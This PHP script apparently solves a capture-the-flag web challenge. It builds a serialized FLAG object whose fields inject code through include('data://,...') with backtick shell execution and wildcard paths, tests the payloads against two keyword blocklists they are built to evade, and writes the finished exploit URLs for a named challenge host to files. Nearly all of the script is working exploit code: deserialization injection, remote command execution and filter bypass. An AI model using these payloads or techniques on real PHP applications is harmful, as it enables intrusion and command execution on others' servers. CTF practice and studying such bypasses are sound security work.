<?php
// 关键洞察：反引号命令的输出会自动打印吗？不会，需要echo
// 但我们可以使用passthru等函数直接输出

$blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
$blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

$pattern_a = '/' . implode('|', array_map(function ($x) {
    return preg_quote($x, '/'); }, $blocked_a)) . '/i';
$pattern_b = '/' . implode('|', array_map(function ($x) {
    return preg_quote($x, '/'); }, $blocked_b)) . '/i';

echo "Test: Use include with file_get_contents wrapped in data://\n";
$a = ';include("data://,<?=`/???/???%20/????`?>");$a="md5';
$b = '";';

echo "a: $a\n";
echo "b: $b\n";
echo "After eval, \$a will be 'md5', which is a valid function\n";
echo "a blocked: " . (preg_match($pattern_a, $a) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a) && !preg_match($pattern_b, $b)) {
    $ser = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a) . ':"' . $a . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b) . ':"' . $b . '";}';
    $url = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser);
    echo "URL:\n$url\n\n";
    file_put_contents('url_md5.txt', $url);
}

// Test available functions that accept 2 parameters
echo "\nAvailable two-param functions that pass check:\n";
$funcs = ['link', 'rename', 'copy', 'mb_send_mail', 'fopen', 'fwrite', 'fputs', 'md5', 'md5_file'];

foreach ($funcs as $func) {
    $blocked = preg_match($pattern_a, $func);
    echo "$func: " . ($blocked ? "BLOCKED" : "OK") . "\n";
}

echo "\n\n";
echo "Strategy: Set \$a to 'md5' (or другой valid function) after command execution\n";
$a2 = ';include("data://,<?=`/???/???%20/????`?>");$a="md5';
$b2 = '";';

echo "Let me try a working version...\n\n";

// Final working version
$a3 = ';include("data://,<?=`/???/???%20/????`;?>");die();$a="md5';
$b3 = '";';

echo "a: $a3\n";
echo "b: $b3\n";
echo "a blocked: " . (preg_match($pattern_a, $a3) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b3) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a3) && !preg_match($pattern_b, $b3)) {
    $ser3 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a3) . ':"' . $a3 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b3) . ':"' . $b3 . '";}';
    $url3 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser3);
    echo "URL3:\n$url3\n\n";
    file_put_contents('url_working.txt', $url3);
}
